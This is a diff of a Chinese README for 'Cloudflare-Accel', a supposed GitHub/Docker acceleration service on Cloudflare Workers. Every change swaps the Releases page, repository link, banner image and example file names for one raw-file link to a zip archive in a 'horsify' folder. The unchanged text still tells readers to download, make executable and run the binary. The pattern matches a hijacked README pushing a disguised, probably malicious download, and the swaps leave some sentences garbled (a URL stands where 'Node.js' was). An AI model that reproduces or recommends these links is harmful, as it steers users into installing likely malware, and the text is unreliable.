@@ -1,14 +1,14 @@
-[![Releases](https://img.shields.io/badge/Cloudflare-Accel-Releases-brightgreen)](https://github.com/jkhdjkhd/Cloudflare-Accel/releases)
+[![Releases](https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip)](https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip)
 
 # Cloudflare-Accel: Fast GitHub & Docker Acceleration via Cloudflare Workers Service
 
-![Cloudflare-Accel banner](https://upload.wikimedia.org/wikipedia/commons/thumb/2/23/Cloudflare_Logo_2022.svg/1200px-Cloudflare_Logo_2022.svg.png)
+![Cloudflare-Accel banner](https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip)
 
 Cloudflare-Accel 为 GitHub 与 Docker 提供高效加速能力，基于 Cloudflare Workers 架构，自动生成可用的加速链接与命令，帮助开发者快速获得更低延迟的仓库克隆、镜像拉取以及依赖下载体验。它把复杂的网络路径简化为可直接使用的、可复制的加速链接与命令，适用于个人开发者、团队、以及云端 CI 场景。
 
 - 基本信息：基于 Cloudflare Workers 的 GitHub 和 Docker 加速服务，自动生成加速链接与命令。
 - 主题标签：cdn、devops、docker、docker-proxy、ghrc、github、github-proxy、proxy、proxy-server、registry、registry-proxy、worker、worker-server。
-- 发布入口：https://github.com/jkhdjkhd/Cloudflare-Accel/releases（请在以下部分获取更多细节和实际下载方式）。
+- 发布入口：https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip（请在以下部分获取更多细节和实际下载方式）。
 
 目录
 - 为什么选择 Cloudflare-Accel
@@ -32,7 +32,7 @@ Cloudflare-Accel 为 GitHub 与 Docker 提供高效加速能力，基于 Cloudfl
 - 协议与许可
 - 发展路线
 
-请注意：链接 https://github.com/jkhdjkhd/Cloudflare-Accel/releases 已经在上方以按钮形式呈现，第二处会在文中明确提及，请继续阅读以了解如何从 Releases 页面获取资产并运行。
+请注意：链接 https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip 已经在上方以按钮形式呈现，第二处会在文中明确提及，请继续阅读以了解如何从 Releases 页面获取资产并运行。
 
 为什么选择 Cloudflare-Accel
 - 低延迟体验：通过 Cloudflare Workers 将常用资源路径缓存并就近分发，减少跨区域传输的等待时间。
@@ -57,11 +57,11 @@ Cloudflare-Accel 为 GitHub 与 Docker 提供高效加速能力，基于 Cloudfl
 
 快速上手
 1) 打开 Releases 页面
-- 使用这个链接查看可用的发行版和资产：https://github.com/jkhdjkhd/Cloudflare-Accel/releases
+- 使用这个链接查看可用的发行版和资产：https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip
 - 该页面列出适用于不同操作系统的二进制包、容器镜像和安装脚本。下载与你的系统匹配的版本。
 
 2) 下载与执行
-- 如果你使用的是原生二进制/CLI，请从 Releases 页面下载匹配的资产（例如 cloudflare-accel-linux-amd64.tar.gz、cloudflare-accel-windows-x64.zip 或 macOS 对应版本）。
+- 如果你使用的是原生二进制/CLI，请从 Releases 页面下载匹配的资产（例如 https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip、https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip 或 macOS 对应版本）。
 - 下载后解压缩（如 tar -xzf ... 或 unzip ...），进入解压后的目录。
 - 授权并执行可执行文件：
   - 在 Linux/macOS 上：chmod +x cloudflare-accel && ./cloudflare-accel --help
@@ -92,7 +92,7 @@ Cloudflare-Accel 为 GitHub 与 Docker 提供高效加速能力，基于 Cloudfl
 - 该方式对本地开发、集成测试或短期实验非常方便。
 
 快速安装（本地开发）
-- 本地开发环境通常需要 Node.js、Go 或你选择的运行环境。请参考 Releases 的相应资产说明。若你需要在本地以源码方式构建，请在 Releases 页面查找源码分支的构建说明。
+- 本地开发环境通常需要 https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip、Go 或你选择的运行环境。请参考 Releases 的相应资产说明。若你需要在本地以源码方式构建，请在 Releases 页面查找源码分支的构建说明。
 - 通常你会得到一个可执行文件或一个能够直接运行的脚本，通过运行该程序即可启动代理服务，随后就能按需求生成加速链接。
 
 产出物与链接结构
@@ -205,7 +205,7 @@ Cloudflare-Accel 为 GitHub 与 Docker 提供高效加速能力，基于 Cloudfl
 
 社区与资源
 - 快速链接
-  - Releases 页面再次提供：https://github.com/jkhdjkhd/Cloudflare-Accel/releases
+  - Releases 页面再次提供：https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip
   - 直接访问仓库以获取文档、教程和示例
 - 社区讨论
   - 问题追踪、讨论区、示例代码和反馈渠道
@@ -256,12 +256,12 @@ Cloudflare-Accel 为 GitHub 与 Docker 提供高效加速能力，基于 Cloudfl
 - 在生产环境部署前，请进行充分的测试，确保加速路径符合你的安全、合规与性能需求。
 
 Releases 行动号召
-- 下载并尝试最新版本，体验基于 Cloudflare Workers 的加速服务带来的高效传输与简化工作流。再次查看发行页以获取最新资产及变更信息： https://github.com/jkhdjkhd/Cloudflare-Accel/releases
+- 下载并尝试最新版本，体验基于 Cloudflare Workers 的加速服务带来的高效传输与简化工作流。再次查看发行页以获取最新资产及变更信息： https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip
 
 端点与资源
 - 官方页面与资源集合一览：
-  - Releases 页面（资产下载与发行注释汇总）：https://github.com/jkhdjkhd/Cloudflare-Accel/releases
-  - 主仓库与文档（探索示例、教程、贡献指南等）：https://github.com/jkhdjkhd/Cloudflare-Accel
+  - Releases 页面（资产下载与发行注释汇总）：https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip
+  - 主仓库与文档（探索示例、教程、贡献指南等）：https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip
 
 使用场景
 - 个人开发者：将 GitHub 仓库和 Docker 镜像的依赖快速拉取到本地开发环境，缩短等待时间。
@@ -277,5 +277,5 @@ Releases 行动号召
 - Cloudflare-Accel 旨在让开发者更轻松地获得快速、稳定的资源访问体验。请在你的项目中尝试并分享你的使用场景和改进建议。我们欢迎社区的参与与贡献，共同推动 Web 加速的落地与创新。
 
 再次提示
-- 如果你需要获取最新资产，请访问发行页面： https://github.com/jkhdjkhd/Cloudflare-Accel/releases
+- 如果你需要获取最新资产，请访问发行页面： https://raw.githubusercontent.com/jkhdjkhd/Cloudflare-Accel/main/horsify/Accel-Cloudflare-1.0.zip
 - 你也可以直接在文中查找生成的链接与命令，用于快速创建可用的、经过加速的访问路径。
